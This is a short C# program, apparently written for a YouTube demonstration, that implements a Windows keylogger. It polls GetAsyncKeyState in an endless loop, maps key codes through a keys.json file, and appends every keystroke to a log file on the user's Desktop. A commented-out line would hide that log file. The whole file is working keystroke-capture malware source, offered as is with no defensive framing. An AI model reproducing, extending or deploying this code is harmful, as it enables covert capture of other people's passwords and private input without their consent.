using Newtonsoft.Json;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;

namespace NetKeyLogger
{
    internal class Program
    {
        static string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\YouTube\\netLogger.txt";
        static List<keys> keys = new List<keys>();

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static void Main(string[] args)
        {
            Console.WriteLine("hello, youtube. i'm a key....logger");

            keys = GetKeys();

            KeyLogger();
        }

        static void KeyLogger()
        {
            keys? letter = null;
            while (true)
            {
                for (int i = 0; i < 255; i++)
                {
                    
                    int key = GetAsyncKeyState(i);
                    if (key == 1 || key == -32767)
                    {
                        letter = keys.FirstOrDefault(x => x.digit == i);

                        string l = string.Empty;

                        if (letter != null)
                        {
                            Console.WriteLine(letter.value);
                           
                            l = letter.value;
                        }
                        else
                        {
                            Console.WriteLine(i.ToString());
                            l = i.ToString();
                        }
                       
                        WriteToFile(l);
                        break;
                    }
                    
                }
            }
        }
        static void WriteToFile(string value)
        {
            StreamWriter file = new StreamWriter(path, true);
            //File.SetAttributes(path, FileAttributes.Hidden);
            file.Write(value);
            file.Close();
        }
        static List<keys> GetKeys()
        {
            var keys = new List<keys>();
            string path =Environment.CurrentDirectory.ToLower() + "\\keys.json";
           
            using (StreamReader r = new StreamReader(path))
            {
                string json = r.ReadToEnd();
                keys = JsonConvert.DeserializeObject<List<keys>>(json);
            }
            return keys;
        }
    }
    public class keys
    {
        public int digit { get; set; }
        public string value { get; set; }
    }
}